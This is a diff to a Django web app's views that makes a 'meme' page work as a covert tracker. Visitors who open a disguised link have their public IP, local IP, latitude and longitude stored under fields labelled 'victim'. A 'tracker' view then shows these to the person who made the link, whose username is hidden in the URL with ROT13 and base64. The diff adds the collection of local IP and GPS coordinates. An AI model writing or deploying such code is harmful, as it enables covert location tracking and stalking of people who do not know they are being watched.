@@ -345,39 +345,53 @@ def settings(request):
 
     return render(request, 'settings.html')
 
+
+
 @csrf_exempt
 def meme(request, username):
-  imgurl=None
-  ip=None
+
   if request.method == 'GET':
-    ip = request.META.get('REMOTE_ADDR')
-    print(ip)
+    return render(request, 'meme.html')
+
   elif request.method == 'POST':
     username = username
+    localip = str(request.POST.get('locip'))
+    viclatitude = str(request.POST.get('latitude'))
+    viclongitude = str(request.POST.get('longitude'))
+  
+
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+
     if x_forwarded_for:
-        ip = x_forwarded_for.split(',')[0]
+        publicip = str(x_forwarded_for.split(',')[0])
     else:
-        ip = request.META.get('REMOTE_ADDR')
-    print(ip)
-    print(request.POST.get('latitude'))
-    print(request.POST.get('longitude'))
-    img = (requests.get("https://meme-api.herokuapp.com/gimme"))
-    imgurl = img.json()
-    imgurl = imgurl['url']
-  secret=str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a','=')
-  secret=base64.b64decode(secret)
-  secret=secret.decode('ascii')
-  secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in secret])
-  user = User.objects.filter(username=secret).first()
-  if user.profile.victimips == '':
-    user.profile.victimips = ip
-  elif ip in user.profile.victimips:
-    pass
-  else:
-    user.profile.victimips += ','+ip
-  user.profile.save()
-  return render(request, 'meme.html', {'img':imgurl})
+        publicip = str(request.META.get('REMOTE_ADDR'))
+
+    secret=str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a','=')
+    secret=base64.b64decode(secret)
+    secret=secret.decode('ascii')
+    secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in secret])
+    user = User.objects.filter(username=secret).first()
+
+    if user.profile.victimpublicip == '': # Assigning values for the first time
+      user.profile.victimpublicip = publicip
+      user.profile.victimlocip = localip
+      user.profile.victimlatitude = viclatitude
+      user.profile.victimlongitude = viclongitude
+
+    else:
+
+      if publicip not in user.profile.victimpublicip: #Checking whether the Public Ip already exists in DB
+        user.profile.victimpublicip += ','+publicip # Appending values from 2nd time
+        user.profile.victimlocip += ','+localip
+        user.profile.victimlatitude += ','+viclatitude
+        user.profile.victimlongitude += ','+viclongitude
+
+      else:
+        pass
+
+    user.profile.save()
+    return render(request, 'meme.html')
 
   
 @csrf_exempt
@@ -386,24 +400,42 @@ def tracker(request):
   if request.method == 'GET':
     GET = {
 		"request_type" : 'GET'
-	}
-    
+	  }
     return render(request, 'tracker.html',{'get':GET})
 
   if request.method == 'POST':
     username = request.user.username
     user = User.objects.filter(username=username).first()
+
     secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in str(username)])
     secret=base64.b64encode(str(secret).encode('ascii'))
     if "=" in str(secret.decode('ascii')):
           secret=str(secret.decode('ascii')).replace('=','a')
-    url = "https://"+str(request.META['HTTP_HOST'])+'/meme/' + str(secret)
-    
-    victimips = user.profile.victimips
-    victimips = victimips.split(',')
-    if victimips == ['']:
+    url = "http://"+str(request.META['HTTP_HOST'])+'/meme/' + str(secret)
+
+    # Fetching values from DB as list
+
+    victimpublicip = user.profile.victimpublicip
+    victimpublicip = victimpublicip.split(",")
+ 
+    victimlocip = user.profile.victimlocip
+    victimlocip = victimlocip.split(",")
+
+    viclatitude = user.profile.victimlatitude
+    viclatitude = viclatitude.split(",")
+
+    viclongitude = user.profile.victimlongitude
+    viclongitude = viclongitude.split(",")
+
+    if victimpublicip != ['']:
+
+      return render(request, 'tracker.html', {'victimpublicip':victimpublicip, 'victimlocip':victimlocip,
+                                            'viclatitude':viclatitude,'viclongitude':viclongitude, 'url':url})
+
+    else:
+
       return render(request, 'tracker.html', {'url':url})
-    return render(request, 'tracker.html', {'victimips':victimips, 'url':url})
+
 
 @csrf_exempt
 def logout(request):
